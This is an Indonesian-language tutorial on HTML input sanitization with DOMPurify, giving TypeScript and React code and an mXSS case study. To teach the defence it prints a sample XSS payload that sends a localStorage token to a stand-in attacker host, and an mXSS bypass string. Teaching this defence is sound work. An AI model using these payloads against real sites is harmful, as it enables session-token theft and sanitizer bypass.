# Input Sanitization

## 1. Skenario Sistem Nyata

Sebuah aplikasi CMS (Content Management System) internal perusahaan memiliki fitur editor artikel blog dan rilis pers. Penulis artikel ingin mempercantik artikel dengan format teks seperti tebal, miring, tabel, dan tautan dokumen menggunakan editor WYSIWYG.

Seorang pengguna nakal mencoba menyalin kode HTML berikut ke dalam editor:
`<img src="invalid-image.jpg" onerror="fetch('https://attacker.site/log?key=' + localStorage.getItem('token'))" />`

Jika aplikasi langsung menyimpan dan menampilkan potongan HTML tersebut ke publik tanpa penyaringan, browser pembaca artikel akan memicu event handler `onerror` dan mengeksekusi JavaScript pencuri token tersebut.

Sistem membutuhkan mekanisme **Input Sanitization** yang mampu membedakan tag HTML yang aman untuk presentasi (seperti `<b>`, `<i>`, `<p>`) dari tag dan atribut berbahaya (seperti `<script>`, `onerror`, `javascript:`).

## 2. Apa Itu dan Buat Apa?

Input Sanitization adalah proses pembersihan dan penyaringan data input pengguna untuk membuang, menonaktifkan, atau mentransformasikan karakter, tag, dan atribut berbahaya sebelum data tersebut diproses lebih lanjut atau dirender ke dalam DOM browser.

Tujuan utama sanitasi adalah memastikan bahwa data yang dimasukkan oleh pengguna luar tidak dapat mengubah konteks eksekusi kode aplikasi, mencegah kerentanan Cross-Site Scripting (XSS), SQL Injection, dan HTML Injection.

Di frontend, sanitasi terutama difokuskan pada pembersihan string HTML yang akan dimasukkan ke dalam elemen DOM menggunakan antarmuka seperti `innerHTML`.

## 3. Kenapa Harus Pakai Ini?

Banyak aplikasi modern yang secara bisnis memang **harus** mendukung input teks berformat (rich text):
- Platform email web (seperti Gmail atau Outlook) yang menampilkan pesan berformat HTML.
- Marketplace yang mengizinkan penjual mendeskripsikan spesifikasi produk dalam tabel dan gambar.
- Platform dokumentasi dan forum komunitas yang mendukung format Markdown/HTML.

Pada skenario tersebut, teknik *output encoding* biasa (mengubah `<` menjadi `&lt;`) tidak bisa digunakan karena teks tebal atau tabel tidak akan terender sebagaimana mestinya. 

Sanitasi memungkinkan fitur rich-text tetap berjalan normal dengan aman, karena hanya elemen-elemen presentasional yang diizinkan (*allowlist*), sedangkan elemen yang dapat mengeksekusi kode skrip dibersihkan secara tuntas.

## 4. Cara Kerjanya

Berikut adalah diagram alur bagaimana library sanitasi standar industri seperti `DOMPurify` memproses dan membersihkan string input HTML mentah:

```
[ Input HTML Kotor dari User / API ]
  '<p>Halo Dunia! <img src="x" onerror="stealData()"><script>bad()</script></p>'
                                 |
                                 v
[ DOMPurify Parser: Membangun In-Memory DOM Tree Terisolasi ]
                                 |
                                 v
[ Tree Walker: Memeriksa Setiap Node & Atribut terhadap Allowlist ]
   - Node <p>: Tag aman -> DIPERTAHANKAN
   - Teks "Halo Dunia!": Teks aman -> DIPERTAHANKAN
   - Node <img>: Tag aman -> DIPERTAHANKAN
     - Atribut src="x": Atribut aman -> DIPERTAHANKAN
     - Atribut onerror="...": EVENT HANDLER BERBAHAYA! -> DIHAPUS
   - Node <script>: TAG EKSEKUTIF BERBAHAYA! -> DIHAPUS TOTAL
                                 |
                                 v
[ Serializer: Menghasilkan String HTML Bersih ]
  '<p>Halo Dunia! <img src="x"></p>'
                                 |
                                 v
[ Aman Dimasukkan ke DOM Aplikasi via element.innerHTML ]
```

## 5. Cuplikan Logika Inti

### Sanitasi Menggunakan DOMPurify di TypeScript

Jangan pernah mencoba membuat fungsi sanitasi sendiri menggunakan regex biasa. Gunakan library yang teruji seperti `dompurify`:

```typescript
// frontend/src/utils/sanitize.ts
import DOMPurify from 'dompurify';

export interface SanitizeOptions {
  allowLinks?: boolean;
}

export function sanitizeHtml(dirtyHtml: string, options: SanitizeOptions = {}): string {
  // Konfigurasi allowlist yang ketat
  const allowedTags = ['p', 'b', 'i', 'em', 'strong', 'u', 'ul', 'ol', 'li', 'h1', 'h2', 'h3', 'blockquote', 'code', 'pre'];
  const allowedAttrs = ['class'];

  if (options.allowLinks) {
    allowedTags.push('a');
    allowedAttrs.push('href', 'target', 'rel');
  }

  // Tambahkan hook DOMPurify untuk mengamankan link eksternal otomatis
  DOMPurify.addHook('afterSanitizeAttributes', (node) => {
    if (node.tagName === 'A' && node.hasAttribute('href')) {
      // Cegah serangan reverse tabnabbing dan protocol injection
      node.setAttribute('rel', 'noopener noreferrer');
      
      const href = node.getAttribute('href') || '';
      if (!href.startsWith('https://') && !href.startsWith('http://') && !href.startsWith('mailto:')) {
        node.removeAttribute('href'); // Hapus tautan javascript: atau data:
      }
    }
  });

  return DOMPurify.sanitize(dirtyHtml, {
    ALLOWED_TAGS: allowedTags,
    ALLOWED_ATTR: allowedAttrs,
    FORCE_BODY: true,
  });
}
```

### Integrasi Aman pada Komponen React

```tsx
// frontend/src/components/RichArticleViewer.tsx
import React, { useMemo } from 'react';
import { sanitizeHtml } from '../utils/sanitize';

interface ArticleProps {
  rawContent: string;
}

export function RichArticleViewer({ rawContent }: ArticleProps) {
  // Lakukan sanitasi ter-memoize agar tidak membebani komputasi setiap re-render
  const cleanHtml = useMemo(() => {
    return sanitizeHtml(rawContent, { allowLinks: true });
  }, [rawContent]);

  return (
    <article 
      className="prose max-w-none"
      // dangerouslySetInnerHTML kini aman karena telah melalui DOMPurify allowlist
      dangerouslySetInnerHTML={{ __html: cleanHtml }} 
    />
  );
}
```

## 6. Kelebihan dan Kekurangan (Trade-offs)

| Kelebihan | Kekurangan / Risiko |
| :--- | :--- |
| Memungkinkan aplikasi merender konten kaya (rich HTML) tanpa risiko eksekusi skrip berbahaya | Membutuhkan dependensi library tambahan (`dompurify`, ~15KB gzipped bundle size) |
| Menghapus atribut event handler berbahaya secara otomatis | Ada biaya komputasi parsing string HTML ke DOM tree di browser client |
| Kebal terhadap serangan varian canggih seperti Mutation XSS (mXSS) | Jika allowlist terlalu longgar, fitur berbahaya baru di HTML standar bisa terlewatkan |

## 7. Kapan Harus Pakai vs Kapan Jangan Pakai

### Kapan Harus Pakai
- Menampilkan output dari text editor WYSIWYG (Quill, TipTap, CKEditor, TinyMCE).
- Menampilkan hasil parsing format Markdown menjadi HTML.
- Merender markup email atau ulasan pengguna yang memang mengizinkan format styling tertentu.

### Kapan Jangan Pakai
- Input form standar seperti nama lengkap, nomor telepon, alamat email, atau kata sandi. Gunakan **Output Encoding** (`element.textContent` atau JSX standar `{value}`) yang jauh lebih ringan dan tanpa overhead library.
- Sanitasi di frontend **bukan pengganti** validasi backend. Backend tetap wajib memvalidasi dan membersihkan data sebelum disimpan ke database!

## 8. Metrik Kunci & Observabilitas

1. **Sanitization Duration (ms)**: Waktu komputasi yang dibutuhkan DOMPurify untuk membersihkan payload HTML. Harus dipantau jika aplikasi merender artikel berukuran ratusan kilobyte.
2. **Blocked Elements Telemetry**: Catat jumlah dan tipe elemen terlarang yang disaring oleh sanitizer. Jika banyak tag `<script>` atau `onerror` ditemukan dari user tertentu, beri sinyal peringatan ke tim keamanan.
3. **Bundle Size Impact**: Pastikan DOMPurify hanya di-load pada rute yang membutuhkan rich text viewer (gunakan *dynamic import*).

## 9. Studi Kasus Industri Nyata

Sebuah platform forum tanya jawab programmer mengalami kerentanan keamanan tingkat tinggi (Critical Severity). Fitur posting pertanyaan mendukung rendering Markdown yang diubah menjadi HTML menggunakan parser library JavaScript open-source sederhana.

Parser tersebut menggunakan serangkaian Regular Expression (Regex) manual untuk menghapus tag `<script>`.

Seorang penyerang berhasil membobol sistem menggunakan teknik **Mutation XSS (mXSS)**:
`<math><mtext><table><mglyph><style><!--</style><img src=x onerror=alert(1)>`

Ketika regex manual memeriksa string tersebut, tag tampak seperti teks di dalam komentar `<style><!--`. Namun, ketika browser merender HTML tersebut ke DOM, browser memutarbalikkan struktur pohon elemen (*DOM mutation*), menyebabkan tag `<img>` tereksekusi di luar tag `<style>`.

Solusi rekayasa:
1. Menghapus total seluruh fungsi regex manual buatan sendiri.
2. Mengintegrasikan `DOMPurify` yang dirancang khusus untuk membedah dan menetralkan mutation XSS pada level browser HTML parser.
3. Menjalankan automated regression security test untuk memastikan payload mXSS gagal dieksekusi.

## 10. Fakta Menarik & Gotchas Production

- **Jangan Pernah Menggunakan Regex untuk HTML**: HTML bukanlah bahasa reguler; parsing HTML dengan Regular Expression hampir selalu memiliki celah lolos (*bypass*) karena variasi enkripsi karakter, spasi, dan perilaku quirk browser.
- **Bahaya `target="_blank"`**: Saat mengizinkan tag `<a>`, selalu paksa atribut `rel="noopener noreferrer"`. Tanpa ini, halaman yang dibuka bisa mengakses objek `window.opener` dan mengubah URL tab asli aplikasi Anda (*Reverse Tabnabbing*).
- **Sanitasi Dua Sisi**: Sanitasi di frontend melindungi browser pengguna saat ini dari input yang belum disimpan. Sanitasi di backend melindungi data yang tersimpan di database dari konsumsi klien lain (seperti mobile app atau email worker).

## 11. Rangkuman Singkat

Input Sanitization adalah proses pembersihan string HTML tidak terpercaya menggunakan pendekatan allowlist ketat untuk membuang tag dan atribut berbahaya. Gunakan library standar seperti DOMPurify untuk merender konten rich-text dengan aman tanpa mengorbankan keamanan sistem.
